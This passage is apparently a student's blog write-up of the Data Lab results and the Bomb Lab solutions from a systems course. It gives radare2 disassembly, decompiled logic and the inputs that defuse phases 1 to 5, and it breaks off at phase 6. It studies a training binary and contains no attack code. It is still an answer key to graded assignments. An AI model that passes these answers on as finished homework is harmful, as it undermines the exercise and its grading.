&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ ./dlc -e bits.c
dlc:bits.c:147:bitXor: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; operators
dlc:bits.c:156:tmin: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; operators
dlc:bits.c:167:isTmax: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; operators
dlc:bits.c:180:allOddBits: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; operators
dlc:bits.c:190:negate: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; operators
dlc:bits.c:203:isAsciiDigit: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; operators
dlc:bits.c:215:conditional: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; operators
dlc:bits.c:226:isLessOrEqual: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; operators
dlc:bits.c:239:logicalNeg: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; operators
dlc:bits.c:273:howManyBits: &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; operators
dlc:bits.c:292:floatScale2: &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; operators
dlc:bits.c:312:floatFloat2Int: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; operators
dlc:bits.c:330:floatPower2: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; operators
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后编译并执行 &lt;code&gt;./btest&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ make clean
$ make btest
$ ./btest
Score   Rating  Errors  Function
 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       bitXor
 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       tmin
 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       isTmax
 &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       allOddBits
 &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       negate
 &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       isAsciiDigit
 &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       conditional
 &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       isLessOrEqual
 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       logicalNeg
 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       howManyBits
 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       floatScale2
 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       floatFloat2Int
 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       floatPower2
Total points: 36/36
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;lab2-bomb-lab&#34;&gt;Lab2 Bomb-lab&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Solve with radare2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;phase-1&#34;&gt;Phase 1&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_1
[0x00400ee0]&amp;gt; pdf
            ; CALL XREF from dbg.main @ 0x400e3a(x)
┌ 28: sym.phase_1 (int64_t arg1);
│           ; arg int64_t arg1 @ rdi
│           0x00400ee0      4883ec08       sub rsp, 8
│           0x00400ee4      be00244000     mov esi, str.Border_relations_with_Canada_have_never_been_better. ; 0x402400 ; &amp;quot;Border relations with Canada have never been better.&amp;quot; ; int64_t arg2
│           0x00400ee9      e84a040000     call sym.strings_not_equal
│           0x00400eee      85c0           test eax, eax
│       ┌─&amp;lt; 0x00400ef0      7405           je 0x400ef7
│       │   0x00400ef2      e843050000     call sym.explode_bomb
│       │   ; CODE XREF from sym.phase_1 @ 0x400ef0(x)
│       └─&amp;gt; 0x00400ef7      4883c408       add rsp, 8
└           0x00400efb      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A simple strcmp&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Border relations with Canada have never been better.
Phase 1 defused. How about the next one?
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-2&#34;&gt;Phase 2&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_2
[0x00400efc]&amp;gt; pdf
            ; CALL XREF from dbg.main @ 0x400e56(x)
┌ 69: sym.phase_2 (const char *s);
│           ; arg const char *s @ rdi
│           ; var int64_t var_4h @ rsp+0x4
│           ; var int64_t var_18h @ rsp+0x18
│           0x00400efc      55             push rbp
│           0x00400efd      53             push rbx
│           0x00400efe      4883ec28       sub rsp, 0x28
│           0x00400f02      4889e6         mov rsi, rsp                ; int64_t arg2
│           0x00400f05      e852050000     call sym.read_six_numbers
│           0x00400f0a      833c2401       cmp dword [rsp], 1
│       ┌─&amp;lt; 0x00400f0e      7420           je 0x400f30
│       │   0x00400f10      e825050000     call sym.explode_bomb
..
│      ││   ; CODE XREFS from sym.phase_2 @ 0x400f2c(x), 0x400f3a(x)
│    ┌┌───&amp;gt; 0x00400f17      8b43fc         mov eax, dword [rbx - 4]
│    ╎╎││   0x00400f1a      01c0           add eax, eax
│    ╎╎││   0x00400f1c      3903           cmp dword [rbx], eax
│   ┌─────&amp;lt; 0x00400f1e      7405           je 0x400f25
│   │╎╎││   0x00400f20      e815050000     call sym.explode_bomb
│   │╎╎││   ; CODE XREF from sym.phase_2 @ 0x400f1e(x)
│   └─────&amp;gt; 0x00400f25      4883c304       add rbx, 4
│    ╎╎││   0x00400f29      4839eb         cmp rbx, rbp
│    └────&amp;lt; 0x00400f2c      75e9           jne 0x400f17
│    ┌────&amp;lt; 0x00400f2e      eb0c           jmp 0x400f3c
│    │╎││   ; CODE XREF from sym.phase_2 @ 0x400f0e(x)
│    │╎││   ; CODE XREF from sym.phase_2 @ +0x19(x)
│    │╎└└─&amp;gt; 0x00400f30      488d5c2404     lea rbx, [var_4h]
│    │╎     0x00400f35      488d6c2418     lea rbp, [var_18h]
│    │└───&amp;lt; 0x00400f3a      ebdb           jmp 0x400f17
│    │      ; CODE XREF from sym.phase_2 @ 0x400f2e(x)
│    └────&amp;gt; 0x00400f3c      4883c428       add rsp, 0x28
│           0x00400f40      5b             pop rbx
│           0x00400f41      5d             pop rbp
└           0x00400f42      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;read_six_numbers()&lt;/code&gt; read from input string &lt;code&gt;char *s&lt;/code&gt; with format &lt;code&gt;%d %d %d %d %d %d&lt;/code&gt;, and saved numbers in an array on stack.&lt;/p&gt;
&lt;p&gt;The first &lt;code&gt;cmp&lt;/code&gt; compare the first number with const int &lt;code&gt;1&lt;/code&gt;. After that, the program fall into a loop, which compare &lt;code&gt;array[cur]&lt;/code&gt; with &lt;code&gt;array[cur - 1] * 2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Therefore, our input should be:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Phase 1 defused. How about the next one?
1 2 4 8 16 32
That&#39;s number 2.  Keep going!
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-3&#34;&gt;Phase 3&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_3
[0x00400f43]&amp;gt; pdf
            ; CALL XREF from dbg.main @ 0x400e72(x)
┌ 132: sym.phase_3 (const char *s);
│           ; arg const char *s @ rdi
│           ; var uint32_t var_8h @ rsp+0x8
│           ; var uint32_t var_ch @ rsp+0xc
│           0x00400f43      4883ec18       sub rsp, 0x18
│           0x00400f47      488d4c240c     lea rcx, [var_ch]
│           0x00400f4c      488d542408     lea rdx, [var_8h]           ;   ...
│           0x00400f51      becf254000     mov esi, 0x4025cf           ; &amp;quot;%d %d&amp;quot; ; const char *format
│           0x00400f56      b800000000     mov eax, 0
│           0x00400f5b      e890fcffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)
│           0x00400f60      83f801         cmp eax, 1                  ; 1
│       ┌─&amp;lt; 0x00400f63      7f05           jg 0x400f6a
│       │   0x00400f65      e8d0040000     call sym.explode_bomb
│       │   ; CODE XREF from sym.phase_3 @ 0x400f63(x)
│       └─&amp;gt; 0x00400f6a      837c240807     cmp dword [var_8h], 7
│       ┌─&amp;lt; 0x00400f6f      773c           ja case.default.0x400f75
│       │   0x00400f71      8b442408       mov eax, dword [var_8h]
│       │   ;-- switch
│       │   0x00400f75      ff24c5702440.  jmp qword [rax*8 + 0x402470] ; &amp;quot;|\x0f@&amp;quot; ; switch table (8 cases) at 0x402470
│       │   ;-- case 0:                                                ; from 0x00400f75
│       │   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│       │   0x00400f7c      b8cf000000     mov eax, 0xcf               ; 207
│      ┌──&amp;lt; 0x00400f81      eb3b           jmp 0x400fbe
│      ││   ;-- case 2:                                                ; from 0x00400f75
│      ││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│      ││   0x00400f83      b8c3020000     mov eax, 0x2c3              ; 707
│     ┌───&amp;lt; 0x00400f88      eb34           jmp 0x400fbe
│     │││   ;-- case 3:                                                ; from 0x00400f75
│     │││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│     │││   0x00400f8a      b800010000     mov eax, 0x100              ; 256
│    ┌────&amp;lt; 0x00400f8f      eb2d           jmp 0x400fbe
│    ││││   ;-- case 4:                                                ; from 0x00400f75
│    ││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│    ││││   0x00400f91      b885010000     mov eax, 0x185              ; 389
│   ┌─────&amp;lt; 0x00400f96      eb26           jmp 0x400fbe
│   │││││   ;-- case 5:                                                ; from 0x00400f75
│   │││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│   │││││   0x00400f98      b8ce000000     mov eax, 0xce               ; 206
│  ┌──────&amp;lt; 0x00400f9d      eb1f           jmp 0x400fbe
│  ││││││   ;-- case 6:                                                ; from 0x00400f75
│  ││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│  ││││││   0x00400f9f      b8aa020000     mov eax, 0x2aa              ; 682
│ ┌───────&amp;lt; 0x00400fa4      eb18           jmp 0x400fbe
│ │││││││   ;-- case 7:                                                ; from 0x00400f75
│ │││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│ │││││││   0x00400fa6      b847010000     mov eax, 0x147              ; 327
│ ────────&amp;lt; 0x00400fab      eb11           jmp 0x400fbe
│ │││││││   ;-- default:                                               ; from 0x400f75
│ │││││││   ; CODE XREFS from sym.phase_3 @ 0x400f6f(x), 0x400f75(x)
│ ││││││└─&amp;gt; 0x00400fad      e888040000     call sym.explode_bomb
..
│ │││││││   ;-- case 1:                                                ; from 0x00400f75
│ │││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
│ │││││││   0x00400fb9      b837010000     mov eax, 0x137              ; 311
│ │││││││   ; XREFS: CODE 0x00400f81  CODE 0x00400f88  CODE 0x00400f8f  CODE 0x00400f96  CODE 0x00400f9d  CODE 0x00400fa4
│ │││││││   ; XREFS: CODE 0x00400fab  CODE 0x00400fb7
│ └└└└└└└─&amp;gt; 0x00400fbe      3b44240c       cmp eax, dword [var_ch]
│       ┌─&amp;lt; 0x00400fc2      7405           je 0x400fc9
│       │   0x00400fc4      e871040000     call sym.explode_bomb
│       │   ; CODE XREF from sym.phase_3 @ 0x400fc2(x)
│       └─&amp;gt; 0x00400fc9      4883c418       add rsp, 0x18
└           0x00400fcd      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;First read 2 number from input (format is &lt;code&gt;%d %d&lt;/code&gt;), and save them in &lt;code&gt;[var_8h], [var_ch]&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Number 1 in &lt;code&gt;[var_8h]&lt;/code&gt; is used for a switch-case, and Number 2 in &lt;code&gt;[var_ch]&lt;/code&gt; is used to compare with eax which set in case.&lt;/p&gt;
&lt;p&gt;Valid input:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0 207
1 311
2 707
3 256
4 389
5 206
6 682
7 327
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For example:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;That&#39;s number 2.  Keep going!
7 327
Halfway there!
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-4&#34;&gt;Phase 4&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_4
[0x0040100c]&amp;gt; pdf
            ; CALL XREF from dbg.main @ 0x400e8e(x)
┌ 86: sym.phase_4 (const char *s);
│           ; arg const char *s @ rdi
│           ; var uint32_t var_8h @ rsp+0x8
│           ; var uint32_t var_ch @ rsp+0xc
│           0x0040100c      4883ec18       sub rsp, 0x18
│           0x00401010      488d4c240c     lea rcx, [var_ch]
│           0x00401015      488d542408     lea rdx, [var_8h]           ;   ...
│           0x0040101a      becf254000     mov esi, 0x4025cf           ; &amp;quot;%d %d&amp;quot; ; const char *format
│           0x0040101f      b800000000     mov eax, 0
│           0x00401024      e8c7fbffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)
│           0x00401029      83f802         cmp eax, 2                  ; 2
│       ┌─&amp;lt; 0x0040102c      7507           jne 0x401035
│       │   0x0040102e      837c24080e     cmp dword [var_8h], 0xe
│      ┌──&amp;lt; 0x00401033      7605           jbe 0x40103a
│      ││   ; CODE XREF from sym.phase_4 @ 0x40102c(x)
│      │└─&amp;gt; 0x00401035      e800040000     call sym.explode_bomb
│      │    ; CODE XREF from sym.phase_4 @ 0x401033(x)
│      └──&amp;gt; 0x0040103a      ba0e000000     mov edx, 0xe                ; 14 ; int64_t arg3
│           0x0040103f      be00000000     mov esi, 0                  ; int64_t arg2
│           0x00401044      8b7c2408       mov edi, dword [var_8h]     ; int64_t arg1
│           0x00401048      e881ffffff     call sym.func4
│           0x0040104d      85c0           test eax, eax
│       ┌─&amp;lt; 0x0040104f      7507           jne 0x401058
│       │   0x00401051      837c240c00     cmp dword [var_ch], 0
│      ┌──&amp;lt; 0x00401056      7405           je 0x40105d
│      ││   ; CODE XREF from sym.phase_4 @ 0x40104f(x)
│      │└─&amp;gt; 0x00401058      e8dd030000     call sym.explode_bomb
│      │    ; CODE XREF from sym.phase_4 @ 0x401056(x)
│      └──&amp;gt; 0x0040105d      4883c418       add rsp, 0x18
└           0x00401061      c3             ret


[0x0040100c]&amp;gt; s sym.func4
[0x00400fce]&amp;gt; pdf
            ; CALL XREFS from sym.func4 @ 0x400fe9(x), 0x400ffe(x)
            ; CALL XREF from sym.phase_4 @ 0x401048(x)
┌ 62: sym.func4 (signed int arg1, int64_t arg2, int64_t arg3);
│           ; arg signed int arg1 @ rdi
│           ; arg int64_t arg2 @ rsi
│           ; arg int64_t arg3 @ rdx
│           0x00400fce      4883ec08       sub rsp, 8
│           0x00400fd2      89d0           mov eax, edx                ; arg3
│           0x00400fd4      29f0           sub eax, esi                ; arg2
│           0x00400fd6      89c1           mov ecx, eax
│           0x00400fd8      c1e91f         shr ecx, 0x1f
│           0x00400fdb      01c8           add eax, ecx
│           0x00400fdd      d1f8           sar eax, 1
│           0x00400fdf      8d0c30         lea ecx, [rax + rsi]
│           0x00400fe2      39f9           cmp ecx, edi                ; arg1
│       ┌─&amp;lt; 0x00400fe4      7e0c           jle 0x400ff2
│       │   0x00400fe6      8d51ff         lea edx, [rcx - 1]
│       │   0x00400fe9      e8e0ffffff     call sym.func4
│       │   0x00400fee      01c0           add eax, eax
│      ┌──&amp;lt; 0x00400ff0      eb15           jmp 0x401007
│      ││   ; CODE XREF from sym.func4 @ 0x400fe4(x)
│      │└─&amp;gt; 0x00400ff2      b800000000     mov eax, 0
│      │    0x00400ff7      39f9           cmp ecx, edi                ; arg1
│      │┌─&amp;lt; 0x00400ff9      7d0c           jge 0x401007
│      ││   0x00400ffb      8d7101         lea esi, [rcx + 1]
│      ││   0x00400ffe      e8cbffffff     call sym.func4
│      ││   0x00401003      8d440001       lea eax, [rax + rax + 1]
│      ││   ; CODE XREFS from sym.func4 @ 0x400ff0(x), 0x400ff9(x)
│      └└─&amp;gt; 0x00401007      4883c408       add rsp, 8
└           0x0040100b      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Still, read 2 numbers from input by &lt;code&gt;sscanf()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;func4()&lt;/code&gt; should be:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func4&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; a2, &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; a3){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; a2;
    ecx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1f&lt;/span&gt;;
    ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a2;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; a1) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func4(a1, a2, a3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; a1) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; func4(a1, a2, a3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our target is &lt;code&gt;func(input[0], 0, 14) == 0&lt;/code&gt;, therefore &lt;code&gt;input[0]&lt;/code&gt; should be &lt;code&gt;0&lt;/code&gt; or &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Since &lt;code&gt;cmp dword [var_ch], 0&lt;/code&gt;, &lt;code&gt;input[1]&lt;/code&gt; should be &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Halfway there!
1 0
So you got that one.  Try this one.
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-5&#34;&gt;Phase 5&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_5
[0x00401062]&amp;gt; pdf
            ; CALL XREF from dbg.main @ 0x400eaa(x)
┌ 137: sym.phase_5 (int64_t arg1);
│           ; arg int64_t arg1 @ rdi
│           ; var int64_t var_10h @ rsp+0x10
│           ; var int64_t var_16h @ rsp+0x16
│           ; var int64_t canary @ rsp+0x18
│           0x00401062      53             push rbx
│           0x00401063      4883ec20       sub rsp, 0x20
│           0x00401067      4889fb         mov rbx, rdi                ; arg1
│           0x0040106a      64488b042528.  mov rax, qword fs:[0x28]
│           0x00401073      4889442418     mov qword [canary], rax
│           0x00401078      31c0           xor eax, eax
│           0x0040107a      e89c020000     call sym.string_length
│           0x0040107f      83f806         cmp eax, 6                  ; 6
│       ┌─&amp;lt; 0x00401082      744e           je 0x4010d2
│       │   0x00401084      e8b1030000     call sym.explode_bomb
..
│      ││   ; CODE XREFS from sym.phase_5 @ 0x4010ac(x), 0x4010d7(x)
│    ┌┌───&amp;gt; 0x0040108b      0fb60c03       movzx ecx, byte [rbx + rax]
│    ╎╎││   0x0040108f      880c24         mov byte [rsp], cl
│    ╎╎││   0x00401092      488b1424       mov rdx, qword [rsp]
│    ╎╎││   0x00401096      83e20f         and edx, 0xf                ; 15
│    ╎╎││   0x00401099      0fb692b02440.  movzx edx, byte [rdx + obj.array.3449] ; [0x4024b0:1]=109 ; &amp;quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&amp;quot;
│    ╎╎││   0x004010a0      88540410       mov byte [rsp + rax + 0x10], dl
│    ╎╎││   0x004010a4      4883c001       add rax, 1
│    ╎╎││   0x004010a8      4883f806       cmp rax, 6                  ; 6
│    └────&amp;lt; 0x004010ac      75dd           jne 0x40108b
│     ╎││   0x004010ae      c644241600     mov byte [var_16h], 0
│     ╎││   0x004010b3      be5e244000     mov esi, str.flyers         ; 0x40245e ; &amp;quot;flyers&amp;quot; ; int64_t arg2
│     ╎││   0x004010b8      488d7c2410     lea rdi, [var_10h]          ; int64_t arg1
│     ╎││   0x004010bd      e876020000     call sym.strings_not_equal
│     ╎││   0x004010c2      85c0           test eax, eax
│    ┌────&amp;lt; 0x004010c4      7413           je 0x4010d9
│    │╎││   0x004010c6      e86f030000     call sym.explode_bomb
..
│   ││╎││   ; CODE XREF from sym.phase_5 @ 0x401082(x)
│   ││╎││   ; CODE XREF from sym.phase_5 @ +0x27(x)
│   ││╎└└─&amp;gt; 0x004010d2      b800000000     mov eax, 0
│   ││└───&amp;lt; 0x004010d7      ebb2           jmp 0x40108b
│   ││      ; CODE XREF from sym.phase_5 @ 0x4010c4(x)
│   ││      ; CODE XREF from sym.phase_5 @ +0x6e(x)
│   └└────&amp;gt; 0x004010d9      488b442418     mov rax, qword [canary]
│           0x004010de      644833042528.  xor rax, qword fs:[0x28]
│       ┌─&amp;lt; 0x004010e7      7405           je 0x4010ee
│       │   0x004010e9      e842faffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from sym.phase_5 @ 0x4010e7(x)
│       └─&amp;gt; 0x004010ee      4883c420       add rsp, 0x20
│           0x004010f2      5b             pop rbx
└           0x004010f3      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;First, &lt;code&gt;string_length(input) == 6&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Fall into a loop:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
    ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input[i];
    edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf&lt;/span&gt;;
    edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; maduiersnfotvbyl[edx];
    var_10h[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; edx;
}
strings_not_equal(var_10h[i], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flyers&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So our input should be:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x?9 0x?f 0x?e 0x?5 0x?6 0x?7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For easy to input, we can simply set &lt;code&gt;?&lt;/code&gt; as &lt;code&gt;6&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;So you got that one.  Try this one.
ionefg
Good work!  On to the next...
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-6&#34;&gt;Phase 6&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_6
[0x004010f4]&amp;gt; pdf
            ; CALL XREF from dbg.main @ 0x400ec6(x)
┌ 272: sym.phase_6 (const char *s);
│           ; arg const char *s @ rdi
│           ; var int64_t var_18h @ rsp+0x18
│           ; var int64_t var_20h @ rsp+0x20
│           ; var int64_t var_28h @ rsp+0x28
│           ; var int64_t var_50h @ rsp+0x50
│           0x004010f4      4156           push r14
│           0x004010f6      4155           push r13
